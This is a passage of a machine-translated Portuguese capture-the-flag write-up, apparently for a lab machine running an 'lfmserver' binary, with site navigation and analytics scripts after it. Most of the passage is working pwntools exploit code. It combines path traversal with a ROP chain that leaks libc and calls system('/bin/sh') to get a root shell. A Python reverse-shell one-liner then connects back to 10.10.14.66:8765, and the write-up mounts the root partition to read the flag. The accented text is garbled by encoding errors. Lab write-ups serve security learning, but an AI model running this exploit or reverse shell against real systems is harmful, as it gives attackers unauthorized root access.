<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>)<font></font>
send_= INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
r.interactive()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Funciona com sucesso! </font></font><br>
<br>
<img src="https://habrastorage.org/webt/k9/4f/5v/k94f5vkgarkqukz9vhjiprkt1yo.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora vamos usar um vazamento de mem√≥ria e determinar o endere√ßo em que a biblioteca libc est√° carregada. </font><font style="vertical-align: inherit;">Para fazer isso, obtemos o endere√ßo da fun√ß√£o de grava√ß√£o na biblioteca libc carregada.</font></font><br>
<br>
<pre><code class="python hljs">binary = ELF(<span class="hljs-string">"./lfmserver"</span>)<font></font>
libc = ELF(<span class="hljs-string">"./libc6.so"</span>)<font></font>
<font></font>
rop_binary = ROP(binary)<font></font>
rop_binary.write(<span class="hljs-number">0x6</span>, binary.got[<span class="hljs-string">'dup2'</span>])<font></font>
rop = flat(rop_binary.build())<font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)</code></pre><br>
<img src="https://habrastorage.org/webt/f0/5h/nl/f05hnlmsa7slih0sdwajq5kathy.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora selecione o endere√ßo da fun√ß√£o dup2 (os primeiros 8 bytes). </font><font style="vertical-align: inherit;">Subtraia o endere√ßo da fun√ß√£o dup2 na biblioteca descarregada. </font><font style="vertical-align: inherit;">Isto encontrar√° o endere√ßo base da libc.</font></font><br>
<br>
<pre><code class="python hljs">print(<span class="hljs-string">f"[*] Payload sent"</span>)<font></font>
<font></font>
recv_ = r.recvall().split(<span class="hljs-string">b'\r'</span>)<font></font>
leak = u64(recv_[<span class="hljs-number">-1</span>][:<span class="hljs-number">8</span>])<font></font>
print(<span class="hljs-string">f"[*] Leak address: <span class="hljs-subst">{hex(leak)}</span>"</span>)<font></font>
libc.address = leak - libc.symbols[<span class="hljs-string">'dup2'</span>]<font></font>
print(<span class="hljs-string">f"[+] Libc base: <span class="hljs-subst">{hex(libc.address)}</span>"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/xf/t0/x3/xft0x3qwddfzdrfclwkj578gzpk.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora encontre o endere√ßo da linha / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">shell_address = next(libc.search(<span class="hljs-string">b"/bin/sh\x00"</span>))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Resta coletar o ROP, no qual os descritores de E / S padr√£o (0,1,2) ser√£o redirecionados para o descritor registrado no programa (captura 6). </font><font style="vertical-align: inherit;">Ap√≥s o qual a fun√ß√£o do sistema ser√° chamada, onde passaremos o endere√ßo da linha / bin / sh.</font></font><br>
<br>
<pre><code class="python hljs">rop_libc = ROP(libc)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">0</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">1</span>)<font></font>
rop_libc.dup2(<span class="hljs-number">6</span>,<span class="hljs-number">2</span>)<font></font>
rop_libc.system(shell_address)<font></font>
rop = flat(rop_libc.build()) <font></font>
<font></font>
payload = append_and_encode(<span class="hljs-string">b"../../../../../proc/sys/kernel/randomize_va_space"</span>, rop)<font></font>
send_ = INPUTREQ.replace(<span class="hljs-string">b"{1}"</span>, payload).replace(<span class="hljs-string">b"{2}"</span>, md5sum)<font></font>
r = remote(HOST, PORT)<font></font>
r.sendline(send_)<font></font>
<font></font>
context.log_level=<span class="hljs-string">'info'</span><font></font>
r.recv()<font></font>
r.sendline(<span class="hljs-string">b"id"</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/4a/fy/cq/4afycq7-ht7dkktpmeddwci4tqa.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bem! </font><font style="vertical-align: inherit;">N√≥s obtemos o shell da raiz. </font><font style="vertical-align: inherit;">Mas ele est√° morrendo rapidamente. </font><font style="vertical-align: inherit;">Execute o ouvinte (nc -lvp 8765) e ative o shell de conex√£o traseira.</font></font><br>
<br>
<pre><code class="python hljs">r.sendline(<span class="hljs-string">b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.66",8765));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/vj/nh/ci/vjnhcisc1ra9vng8htw8n_2phwi.png" alt="imagem"><br>
<br>
<img src="https://habrastorage.org/webt/tj/ff/ll/tjfflloqumm5mggkbrwlx2ofc6w.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
E n√≥s temos uma concha est√°vel. </font><font style="vertical-align: inherit;">Dou o c√≥digo completo na figura abaixo. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ow/ek/pi/owekpiviv3pqxnxr-rpeqgzv6-a.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas n√£o podemos ler a bandeira raiz ...</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="imagem"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ROOT 3</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Executando linpeas e olhando para a sa√≠da, encontramos se√ß√µes interessantes, especialmente / dev / sda2. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/wu/0u/mg/wu0umgzshoqcoq65eolwojhv8fy.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Vamos obter informa√ß√µes sobre todos os dispositivos de bloco. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ld/ox/-v/ldox-vzassozbyooscg-issuoow.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portanto, temos a parti√ß√£o raiz / dev / sda2. </font><font style="vertical-align: inherit;">Crie um diret√≥rio e monte a parti√ß√£o. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/ez/c5/u4ezc5zbakdqx11phjzr1cqp-yi.png" alt="imagem"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ent√£o, encontramos a bandeira raiz. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Voc√™ pode se juntar a n√≥s no </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . </font><font style="vertical-align: inherit;">L√° voc√™ encontra materiais interessantes, cursos mesclados e softwares. </font><font style="vertical-align: inherit;">Vamos montar uma comunidade na qual haver√° pessoas versadas em muitas √°reas da TI, para que possamos sempre ajudar-nos mutuamente em qualquer problema de seguran√ßa da informa√ß√£o e da TI.</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../pt502256/index.html">Como visualizar um gr√°fico de integra√ß√£o de primavera usando o Neo4j?</a></li>
<li><a href="../pt502260/index.html">O ESP-NOW √© um protocolo de comunica√ß√£o alternativo para o ESP8266 e o ‚Äã‚ÄãESP32. Conceitos B√°sicos</a></li>
<li><a href="../pt502262/index.html">Por que AIOps e monitoramento abrangente para o banco ou sobre o que s√£o constru√≠das as rela√ß√µes com os clientes</a></li>
<li><a href="../pt502264/index.html">Infraestrutura de chave p√∫blica. Emiss√£o de certificados em condi√ß√µes de auto-isolamento</a></li>
<li><a href="../pt502266/index.html">Aurora na plataforma Intel. Amanhecer da Era Exaflops</a></li>
<li><a href="../pt502272/index.html">N√£o diga "eu me sinto", e outras regras em ingl√™s que causam estupor</a></li>
<li><a href="../pt502274/index.html">Personalize o layout do teclado externo no Android sem raiz</a></li>
<li><a href="../pt502276/index.html">M√©todo Kanban: Exemplo PNZ No. 2: Treinamento e Cursos</a></li>
<li><a href="../pt502278/index.html">Como n√£o editar testes Python</a></li>
<li><a href="../pt502286/index.html">Rob√¥s de fogo</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>